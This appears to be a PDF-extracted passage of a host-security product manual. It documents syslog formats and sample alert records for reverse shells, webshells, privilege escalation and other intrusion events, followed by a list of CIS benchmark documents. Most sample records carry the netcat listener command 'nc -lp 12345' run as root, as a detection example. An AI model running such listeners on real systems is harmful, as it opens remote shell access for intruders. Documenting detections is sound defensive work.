+<14>1 2020-08-24T07:50:43Z cfd86f3a54ec cloudwalker 19 cloudwalker-revshell  host_name="Bomb" host_ip="1 0.2.6.83" host_id="190" event_name="WebShell" event_level="critical" event_state="ignored" source_ip="10.9.3 2.227" source_port="39794" target_ip="10.9.32.227" target_port="33211" protocol="tcp" process_id="12" parent_ process_pid="4111388" process_command_line="nc -lp 12345" parent_process_cmdline="bash" process_path="" parent_process_path="bash" event_start_time="2022-01-11 11:19:26" event_description="" event_solution="" <14>1 2020-08-24T07:50:43Z cfd86f3a54ec cloudwalker 19 cloudwalker-revshell [host-info  host_name="Bomb" host_ip="10.2.6.83" host_id="190"][revshell event_name="WebShell" event_level="high" event_state="risky" sour ce_ip="10.9.32.227" source_port="39794" target_ip="10.9.32.227" target_port="33211" protocol="tcp" process_i d="12" parent_process_pid="4111388" process_command_line="nc -lp 12345" parent_process_cmdline="bash" p rocess_path="bin" parent_process_path="bash" event_start_time="2022-01-11 11:19:26" event_description="" ev ent_solution=""] 可疑命令（cloudwalker-suspicious-command） 25  / 111
+
+event_level string 事件等级 nil / low / medium / high / critical event_state string 事件状态 risky / ignored / processed event_create_time timestamp 事件创建时间 2022-01-11 11:19:26 process_tree json_string 进程树 [{"pid": 1, "uid": 0, "euid": 0, "ppid": 0}] process_command_line string 进程命令行 nc -lp 12345 event_start_time timestamp 事件开始时间 2022-01-11 11:19:26 event_end_time timestamp 事件结束时间 2022-01-11 11:19:26 <14>1 2020-08-24T07:50:43Z cfd86f3a54ec cloudwalker 19 cloudwalker-suspicious-command {"host_name": "Bo mb", "host_ip": "10.2.6.83", "host_id": "190", "event_name": "WebShell", "event_level": "nil", "event_state": "ris ky", "event_create_time": "2022-01-11 11:19:26", "process_tree": "[{\"pid\": 1, \"uid\": 0, \"euid\": 0, \"ppid\": 0}]" , "file_path": "", "process_command_line": "nc -lp 12345", "user_id": "0", "user_name": "root", "user_gid": "0", " user_gname": "root", "env": "{}", "event_start_time": "2022-01-11 11:19:26", "event_end_time": "2022-01-11 1
+1:19:26", "event_description": "", "event_solution": ""} 26  / 111
+
+<14>1 2020-08-24T07:50:43Z cfd86f3a54ec cloudwalker 19 cloudwalker-suspicious-command  host_name="Bom b" host_ip="10.2.6.83" host_id="190" event_name="WebShell" event_level="high" event_state="risky" event_crea te_time="2022-01-11 11:19:26" process_tree="[{\"pid\": 1, \"uid\": 0, \"euid\": 0, \"ppid\": 0}]" file_path="" process _command_line="nc -lp 12345" user_id="0" user_name="root" user_gid="0" user_gname="root" env="{}" event_st art_time="2022-01-11 11:19:26" event_end_time="2022-01-11 11:19:26" event_description="" event_solution="" <14>1 2020-08-24T07:50:43Z cfd86f3a54ec cloudwalker 19 cloudwalker-suspicious-command [host-info  host_na me="Bomb" host_ip="10.2.6.83" host_id="190"][suspicious-command event_name="WebShell" event_level="nil" event_state="ignored" event_create_time="2022-01-11 11:19:26" process_tree="[{\"pid\": 1, \"uid\": 0, \"euid\": 0, \"ppid\": 0}]" file_path="" process_command_line="nc -lp 12345" user_id="0" user_name="root" user_gid="0" user _gname="root" env="{}" event_start_time="2022-01-11 11:19:26" event_end_time="2022-01-11 11:19:26" event _description="" event_solution=""] 命令审计（cloudwalker-full-command） process_command_line string 进程命令行 nc -lp 12345 event_start_time timestamp 事件开始时间 2022-01-11 11:19:26 session_id string 会话唯一id 9ae8d0ae-5196-4d5 process_tree json_string 进程树 [{"pid": 1, "uid": 0, "euid": 0, "ppid": 0}] event_create_time timestamp 事件创建时间 2022-01-11 11:19:26 event_end_time timestamp 事件结束时间 2022-01-11 11:19:26 27  / 111
+
+<14>1 2020-08-24T07:50:43Z cfd86f3a54ec cloudwalker 19 cloudwalker-full-command {"host_name": "Bomb", "h ost_ip": "10.2.6.83", "host_id": "190", "process_id": "12", "file_path": "", "process_command_line": "nc -lp 1234 5", "event_start_time": "2022-01-11 11:19:26", "user_id": "0", "user_name": "root", "user_gid": "0", "user_gnam e": "root", "session_id": "9ae8d0ae-5196-4d5", "env": "{}", "process_tree": "[{\"pid\": 1, \"uid\": 0, \"euid\": 0, \"pp id\": 0}]", "event_create_time": "2022-01-11 11:19:26", "event_end_time": "2022-01-11 11:19:26"} <14>1 2020-08-24T07:50:43Z cfd86f3a54ec cloudwalker 19 cloudwalker-full-command  host_name="Bomb" host _ip="10.2.6.83" host_id="190" process_id="12" file_path="" process_command_line="nc -lp 12345" event_start_ti me="2022-01-11 11:19:26" user_id="0" user_name="root" user_gid="0" user_gname="root" session_id="9ae8d0 ae-5196-4d5" env="{}" process_tree="[{\"pid\": 1, \"uid\": 0, \"euid\": 0, \"ppid\": 0}]" event_create_time="2022-01 -11 11:19:26" event_end_time="2022-01-11 11:19:26" <14>1 2020-08-24T07:50:43Z cfd86f3a54ec cloudwalker 19 cloudwalker-full-command [host-info  host_name="Bo mb" host_ip="10.2.6.83" host_id="190"][full-command process_id="12" file_path="" process_command_line="nc -l p 12345" event_start_time="2022-01-11 11:19:26" user_id="0" user_name="root" user_gid="0" user_gname="roo t" session_id="9ae8d0ae-5196-4d5" env="{}" process_tree="[{\"pid\": 1, \"uid\": 0, \"euid\": 0, \"ppid\": 0}]" event_ create_time="2022-01-11 11:19:26" event_end_time="2022-01-11 11:19:26"] 恶意文件（cloudwalker-malware） 28  / 111
+
+event_level string 事件等级 nil / low / medium / high / critical event_state string 事件状态 risky / ignored / processed event_create_time timestamp 事件创建时间 2022-01-11 11:19:26 file_type string 文件类型 text/x-php file_md5 string 文件MD5 4df2702d5b36e6674b012d999419c091 file_create_time timestamp 文件创建时间 2022-01-11 11:19:26 file_access_time timestamp 文件最近访问时间 2022-01-11 11:19:26 file_modified_time timestamp 文件内容修改时间 2022-01-11 11:19:26 <14>1 2020-08-24T07:50:43Z cfd86f3a54ec cloudwalker 19 cloudwalker-malware {"host_name": "Bomb", "host_i p": "10.2.6.83", "host_id": "190", "event_name": "WebShell", "event_level": "low", "event_state": "ignored", "eve nt_create_time": "2022-01-11 11:19:26", "file_type": "x-php", "file_path": "", "file_md5": "4df2702d5b36e6674b 012d999419c091", "file_size": "67816", "file_create_time": "2022-01-11 11:19:26", "file_access_time": "2022-0 1-11 11:19:26", "file_modified_time": "2022-01-11 11:19:26", "event_description": "", "event_solution": ""} <14>1 2020-08-24T07:50:43Z cfd86f3a54ec cloudwalker 19 cloudwalker-malware  host_name="Bomb" host_ip=" 10.2.6.83" host_id="190" event_name="WebShell" event_level="nil" event_state="ignored" event_create_time="2 022-01-11 11:19:26" file_type="x-php" file_path="" file_md5="4df2702d5b36e6674b012d999419c091" file_size ="67816" file_create_time="2022-01-11 11:19:26" file_access_time="2022-01-11 11:19:26" file_modified_time=" 2022-01-11 11:19:26" event_description="" event_solution="" 29  / 111
+
+<14>1 2020-08-24T07:50:43Z cfd86f3a54ec cloudwalker 19 cloudwalker-malware [host-info  host_name="Bomb" host_ip="10.2.6.83" host_id="190"][malware event_name="WebShell" event_level="critical" event_state="ignored " event_create_time="2022-01-11 11:19:26" file_type="text" file_path="" file_md5="4df2702d5b36e6674b012d9 99419c091" file_size="67816" file_create_time="2022-01-11 11:19:26" file_access_time="2022-01-11 11:19:26" file_modified_time="2022-01-11 11:19:26" event_description="" event_solution=""] 暴力破解（cloudwalker-brute-force） event_level string 事件等级 nil / low / medium / high / critical event_state string 事件状态 risky / ignored / processed event_create_time timestamp 事件创建时间 2022-01-11 11:19:26 event_start_time timestamp 事件开始时间 2022-01-11 11:19:26 event_end_time timestamp 事件结束时间 2022-01-11 11:19:26 service_name string 服务名 <14>1 2020-08-24T07:50:43Z cfd86f3a54ec cloudwalker 19 cloudwalker-brute-force {"host_name": "Bomb", "hos t_ip": "10.2.6.83", "host_id": "190", "event_name": "WebShell", "event_level": "high", "event_state": "risky", "ev ent_create_time": "2022-01-11 11:19:26", "event_start_time": "2022-01-11 11:19:26", "event_end_time": "202 2-01-11 11:19:26", "service_name": ""} <14>1 2020-08-24T07:50:43Z cfd86f3a54ec cloudwalker 19 cloudwalker-brute-force  host_name="Bomb" host_ip ="10.2.6.83" host_id="190" event_name="WebShell" event_level="high" event_state="ignored" event_create_time ="2022-01-11 11:19:26" event_start_time="2022-01-11 11:19:26" event_end_time="2022-01-11 11:19:26" servi ce_name="" 30  / 111
+
+<14>1 2020-08-24T07:50:43Z cfd86f3a54ec cloudwalker 19 cloudwalker-brute-force [host-info  host_name="Bom b" host_ip="10.2.6.83" host_id="190"][brute-force event_name="WebShell" event_level="critical" event_state="ig nored" event_create_time="2022-01-11 11:19:26" event_start_time="2022-01-11 11:19:26" event_end_time="20 22-01-11 11:19:26" service_name=""] 蜜罐诱捕（cloudwalker-honeypot） event_level string 事件等级 nil / low / medium / high / critical event_state string 事件状态 risky / ignored / processed event_create_time timestamp 事件创建时间 2022-01-11 11:19:26 event_update_time timestamp 事件更新时间 2022-01-11 11:19:26 event_start_time timestamp 事件开始时间 2022-01-11 11:19:26 source_ip string 原始ip 10.9.32.227 target_ip string 目标ip 10.9.32.227 target_port int 目标端口 39794 event_end_time timestamp 事件结束时间 2022-01-11 11:19:26 <14>1 2020-08-24T07:50:43Z cfd86f3a54ec cloudwalker 19 cloudwalker-honeypot {"host_name": "Bomb", "host _ip": "10.2.6.83", "host_id": "190", "event_name": "WebShell", "event_level": "low", "event_state": "ignored", "e vent_create_time": "2022-01-11 11:19:26", "event_update_time": "2022-01-11 11:19:26", "event_start_time": " 2022-01-11 11:19:26", "source_ip": "10.9.32.227", "target_ip": "10.9.32.227", "target_port": "39794", "event_s olution": "", "event_description": "", "event_end_time": "2022-01-11 11:19:26"} 31  / 111
+
+<14>1 2020-08-24T07:50:43Z cfd86f3a54ec cloudwalker 19 cloudwalker-honeypot  host_name="Bomb" host_ip=" 10.2.6.83" host_id="190" event_name="WebShell" event_level="low" event_state="risky" event_create_time="20 22-01-11 11:19:26" event_update_time="2022-01-11 11:19:26" event_start_time="2022-01-11 11:19:26" source _ip="10.9.32.227" target_ip="10.9.32.227" target_port="39794" event_solution="" event_description="" event_end _time="2022-01-11 11:19:26" <14>1 2020-08-24T07:50:43Z cfd86f3a54ec cloudwalker 19 cloudwalker-honeypot [host-info  host_name="Bomb" host_ip="10.2.6.83" host_id="190"][honeypot event_name="WebShell" event_level="critical" event_state="proce ssed" event_create_time="2022-01-11 11:19:26" event_update_time="2022-01-11 11:19:26" event_start_time=" 2022-01-11 11:19:26" source_ip="10.9.32.227" target_ip="10.9.32.227" target_port="39794" event_solution="" e vent_description="" event_end_time="2022-01-11 11:19:26"] 本地提权（cloudwalker-elevation-process） 32  / 111
+
+event_level string 事件等级 nil / low / medium / high / critical event_state string 事件状态 risky / ignored / processed event_create_time timestamp 事件创建时间 2022-01-11 11:19:26 process_name string 进程名 su process_command_line string 进程命令行 nc -lp 12345 user_target_user string 目标用户（赋权） root user_target_user_id string 目标用户id 0 process_tree json_string 进程树 [{"pid": 1, "uid": 0, "euid": 0, "ppid": 0}] <14>1 2020-08-24T07:50:43Z cfd86f3a54ec cloudwalker 19 cloudwalker-elevation-process {"host_name": "Bomb ", "host_ip": "10.2.6.83", "host_id": "190", "event_name": "WebShell", "event_level": "high", "event_state": "risk y", "event_create_time": "2022-01-11 11:19:26", "process_name": "su", "process_id": "12", "process_comman d_line": "nc -lp 12345", "process_path": "bin", "file_permission": "-rwxr-xr-x", "user_name": "root", "user_gnam e": "root", "user_target_user": "root", "user_target_user_id": "0", "process_tree": "[{\"pid\": 1, \"uid\": 0, \"euid\":
+0, \"ppid\": 0}]", "event_description": "", "event_solution": ""} 33  / 111
+
+<14>1 2020-08-24T07:50:43Z cfd86f3a54ec cloudwalker 19 cloudwalker-elevation-process  host_name="Bomb" host_ip="10.2.6.83" host_id="190" event_name="WebShell" event_level="high" event_state="risky" event_create_ time="2022-01-11 11:19:26" process_name="su" process_id="12" process_command_line="nc -lp 12345" proces s_path="bin" file_permission="-rwxr-xr-x" user_name="root" user_gname="root" user_target_user="root" user_tar get_user_id="0" process_tree="[{\"pid\": 1, \"uid\": 0, \"euid\": 0, \"ppid\": 0}]" event_description="" event_solution= "" <14>1 2020-08-24T07:50:43Z cfd86f3a54ec cloudwalker 19 cloudwalker-elevation-process [host-info  host_name= "Bomb" host_ip="10.2.6.83" host_id="190"][elevation-process event_name="WebShell" event_level="medium" ev ent_state="ignored" event_create_time="2022-01-11 11:19:26" process_name="su" process_id="12" process_co mmand_line="nc -lp 12345" process_path="usr" file_permission="-rwxr-xr-x" user_name="root" user_gname="roo t" user_target_user="root" user_target_user_id="0" process_tree="[{\"pid\": 1, \"uid\": 0, \"euid\": 0, \"ppid\": 0}]" e vent_description="" event_solution=""] 异常登录（cloudwalker-abnormal-login） event_level string 事件等级 nil / low / medium / high / critical event_state string 事件状态 risky / ignored / processed event_create_time timestamp 事件创建时间 2022-01-11 11:19:26 login_ip int 登录ip 10.9.32.227 event_start_time timestamp 事件开始时间 2022-01-11 11:19:26 34  / 111
+
+<14>1 2020-08-24T07:50:43Z cfd86f3a54ec cloudwalker 19 cloudwalker-abnormal-login {"host_name": "Bomb", " host_ip": "10.2.6.83", "host_id": "190", "event_name": "WebShell", "event_level": "medium", "event_state": "ign ored", "event_create_time": "2022-01-11 11:19:26", "login_ip": "10.9.32.227", "event_start_time": "2022-01-11
+11:19:26", "user_name": "root", "event_description": "", "event_solution": ""} <14>1 2020-08-24T07:50:43Z cfd86f3a54ec cloudwalker 19 cloudwalker-abnormal-login  host_name="Bomb" hos t_ip="10.2.6.83" host_id="190" event_name="WebShell" event_level="critical" event_state="ignored" event_creat e_time="2022-01-11 11:19:26" login_ip="10.9.32.227" event_start_time="2022-01-11 11:19:26" user_name="ro ot" event_description="" event_solution="" <14>1 2020-08-24T07:50:43Z cfd86f3a54ec cloudwalker 19 cloudwalker-abnormal-login [host-info  host_name="B omb" host_ip="10.2.6.83" host_id="190"][abnormal-login event_name="WebShell" event_level="high" event_state ="ignored" event_create_time="2022-01-11 11:19:26" login_ip="10.9.32.227" event_start_time="2022-01-11 11:
+19:26" user_name="root" event_description="" event_solution=""] 网络异常（cloudwalker-abnormal-network） 35  / 111
+
+event_level string 事件等级 nil / low / medium / high / critical event_state string 事件状态 risky / ignored / processed event_create_time timestamp 事件创建时间 2022-01-11 11:19:26 event_type string 事件类型 异常 IP外连 process_name string 进程名 su process_command_line string 进程命令行 nc -lp 12345 ip_owner string 所属机构 中国联通 ip_isp string 服务提供商 中国联通 ip_country_code string 国家代码 CN ip_province_code string 省份代码 110000 ip_city_code string 城市代码 110000 <14>1 2020-08-24T07:50:43Z cfd86f3a54ec cloudwalker 19 cloudwalker-abnormal-network {"host_name": "Bom b", "host_ip": "10.2.6.83", "host_id": "190", "event_name": "WebShell", "event_level": "low", "event_state": "risk y", "event_create_time": "2022-01-11 11:19:26", "event_type": "异常IP外连", "process_name": "su", "process_ path": "bash", "process_id": "12", "process_command_line": "nc -lp 12345", "user_id": "0", "user_name": "root", "user_gid": "0", "user_gname": "root", "env": "{}", "ip_owner": "中国联通", "ip_isp": "中国联通", "ip_country_cod e": "CN", "ip_province_code": "110000", "ip_city_code": "110000", "event_description": ""} 36  / 111
+
+<14>1 2020-08-24T07:50:43Z cfd86f3a54ec cloudwalker 19 cloudwalker-abnormal-network  host_name="Bomb" host_ip="10.2.6.83" host_id="190" event_name="WebShell" event_level="high" event_state="risky" event_create_ time="2022-01-11 11:19:26" event_type="异常IP外连" process_name="su" process_path="bin" process_id="12" process_command_line="nc -lp 12345" user_id="0" user_name="root" user_gid="0" user_gname="root" env="{}" i p_owner="中国联通" ip_isp="中国联通" ip_country_code="CN" ip_province_code="110000" ip_city_code="11000 0" event_description="" <14>1 2020-08-24T07:50:43Z cfd86f3a54ec cloudwalker 19 cloudwalker-abnormal-network [host-info  host_name= "Bomb" host_ip="10.2.6.83" host_id="190"][abnormal-network event_name="WebShell" event_level="nil" event_st ate="ignored" event_create_time="2022-01-11 11:19:26" event_type="异常IP外连" process_name="su" process_ path="bin" process_id="12" process_command_line="nc -lp 12345" user_id="0" user_name="root" user_gid="0" u ser_gname="root" env="{}" ip_owner="中国联通" ip_isp="中国联通" ip_country_code="CN" ip_province_code="11 0000" ip_city_code="110000" event_description=""] 基线标准文档 基线标准文档 CIS Amazon Linux 2 Benchmark 2021-07-28 37  / 111
+
+要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS Amazon Linux 2014.09-2015.03 Benchmark 要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS Amazon Linux Benchmark 38  / 111
+
+要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS Apache HTTP Server 2.2 Benchmark Apache HTTP Server Web Server v3.6.0 要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS Apache HTTP Server 2.4 Benchmark Apache HTTP Server Web Server 39  / 111
+
+2020-11-03 要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS Apache Tomcat 7 Benchmark 要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS Apache Tomcat 8 Benchmark 40  / 111
+
+要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS Apache Tomcat 9 Benchmark 2020-12-18 要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS CentOS Linux 6 Benchmark 41  / 111
+
+要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS CentOS Linux 7 Benchmark v3.1.2 2021-09-02 要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS CentOS Linux 8 Benchmark 42  / 111
+
+要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS Debian Family Linux Benchmark Debian Family Linux 2020-09-09 43  / 111
+
+要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS Debian Linux 10 Benchmark 要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS Debian Linux 7 Benchmark 44  / 111
+
+要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS Debian Linux 8 Benchmark v2.0.2 要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS Debian Linux 9 Benchmark 45  / 111
+
+要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS Distribution Independent Linux Benchmark Distribution Independent Linux 2020-06-15 要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS Docker 1.13.0 Benchmark 46  / 111
+
+要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS Docker 1.6 Benchmark 要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS Docker Benchmark 47  / 111
+
+v1.3.1 要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS Docker Community Edition Benchmark 要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS Kubernetes Benchmark 48  / 111
+
+Kubernetes v1.6.0 2020-07-22 要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS Microsoft SQL Server 2008 R2 Benchmark v1.7.0 49  / 111
+
+要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS Microsoft SQL Server 2008 R2 Database Engine Benchmark 要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS Microsoft SQL Server 2012 Benchmark v1.6.0 50  / 111
+
+要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS Microsoft SQL Server 2012 Database Engine Benchmark 要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS Microsoft SQL Server 2014 Benchmark 51  / 111
+
+v1.5.0 要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS Microsoft SQL Server 2016 Benchmark 要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS Microsoft SQL Server 2017 Benchmark 52  / 111
+
+要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS Microsoft SQL Server 2019 Benchmark 要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS Microsoft Windows 10 Enterprise RTM (Release 1507) Benchmark 53  / 111
+
+要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS Microsoft Windows 10 Enterprise Release 1511 Benchmark v1.1.1 要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS Microsoft Windows 10 Enterprise Release 1607 Benchmark 54  / 111
+
+要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS Microsoft Windows 10 Enterprise Release 1703 Benchmark 55  / 111
+
+要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS Microsoft Windows 10 Enterprise Release 1709 Benchmark v1.4.0 要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS Microsoft Windows 10 Enterprise Release 1803 Benchmark v1.5.0 56  / 111
+
+要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS Microsoft Windows 10 Enterprise Release 1809 Benchmark v1.6.1 要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS Microsoft Windows 10 Enterprise Release 1903 Benchmark 57  / 111
+
+v1.7.1 要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS Microsoft Windows 10 Enterprise Release 1909 Benchmark v1.8.1 要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS Microsoft Windows 10 Enterprise Release 2004 Benchmark 58  / 111
+
+v1.9.1 2020-10-23 要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS Microsoft Windows 10 Enterprise Release 20H2 Benchmark v1.10.1 要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS Microsoft Windows 10 Enterprise Release 21H1 Benchmark 59  / 111
+
+v1.11.0 2021-07-16 要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS Microsoft Windows 7 Benchmark 要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS Microsoft Windows 7 Workstation Benchmark 60  / 111
+
+要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS Microsoft Windows 8 Benchmark 61  / 111
+
+要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS Microsoft Windows 8.1 Benchmark v2.2.0 要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS Microsoft Windows 8.1 Workstation Benchmark v2.4.0 62  / 111
+
+要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS Microsoft Windows Server 2003 Benchmark v3.1.0 要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS Microsoft Windows Server 2008 (non-R2) Benchmark 63  / 111
+
+要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS Microsoft Windows Server 2008 R2 Benchmark 要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS Microsoft Windows Server 2012 (non-R2) Benchmark 64  / 111
+
+v2.3.0 2021-09-09 要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS Microsoft Windows Server 2012 R2 Benchmark v2.5.0 2021-09-09 要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS Microsoft Windows Server 2016 RTM (Release 1607) Benchmark 65  / 111
+
+2021-07-16 要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS Microsoft Windows Server 2019 Benchmark v1.2.1 要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS MongoDB 3.2 Benchmark 66  / 111
+
+要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS MongoDB 3.4 Benchmark 67  / 111
+
+要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS MongoDB 3.6 Benchmark 要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS MongoDB 4 Benchmark 68  / 111
+
+2021-07-28 要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS MongoDB 5 Benchmark 2021-10-19 要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS MongoDB Benchmark 69  / 111
+
+要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS NGINX Benchmark NGINX Web Server 要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS Oracle Database 11g R2 Benchmark 70  / 111
+
+v2.2.0 要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS Oracle Database 12c Benchmark 要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS Oracle Database 18c Benchmark 71  / 111
+
+2020-07-16 要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS Oracle Database 19c Benchmark 2020-09-28 要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS Oracle Linux 6 Benchmark 72  / 111
+
+要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS Oracle Linux 7 Benchmark v3.1.1 73  / 111
+
+要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS Oracle Linux 8 Benchmark 要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS Oracle MySQL Community Server 5.6 Benchmark 74  / 111
+
+要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS Oracle MySQL Community Server 5.7 Benchmark 要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS Oracle MySQL Enterprise Edition 5.6 Benchmark 75  / 111
+
+要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS Oracle MySQL Enterprise Edition 5.7 Benchmark 要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS Oracle MySQL Enterprise Edition 8.0 Benchmark 76  / 111
+
+2021-07-30 要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS PostgreSQL 10 Benchmark 要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS PostgreSQL 11 Benchmark 77  / 111
+
+要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS PostgreSQL 12 Benchmark 要下载该标准文档，请在浏览器中打开 CIS 文档下载页面 寻找同名同版本的标准文档并点击  Download PDF  按钮 CIS PostgreSQL 13 Benchmark 78  / 111
+
